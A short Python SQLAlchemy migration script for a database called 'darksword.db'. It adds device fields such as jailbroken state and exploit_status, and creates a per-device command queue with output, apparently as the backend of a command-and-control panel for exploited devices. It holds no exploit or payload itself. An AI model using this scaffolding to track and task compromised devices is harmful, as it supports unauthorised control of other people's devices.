from sqlalchemy import create_engine, text
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent
DATABASE_URL = f"sqlite:///{PROJECT_ROOT / 'darksword.db'}"
engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})

with engine.connect() as conn:
    columns = [
        "os_version VARCHAR(50)",
        "device_model VARCHAR(100)",
        "chipset VARCHAR(100)",
        "jailbroken VARCHAR(10) DEFAULT 'unknown'",
        "exploit_status VARCHAR(20) DEFAULT 'pending'",
        "last_command_time DATETIME"
    ]
    for col in columns:
        try:
            conn.execute(text(f"ALTER TABLE devices ADD COLUMN {col}"))
            print(f"Added column: {col}")
        except Exception as e:
            print(f"Column already exists or error: {col} - {e}")
    conn.commit()
    
    try:
        conn.execute(text("""
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_uuid VARCHAR(100) NOT NULL,
                command TEXT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                output TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_at DATETIME
            )
        """))
        print("Created commands table")
    except Exception as e:
        print(f"Commands table already exists: {e}")
    conn.commit()

print("Migration completed")
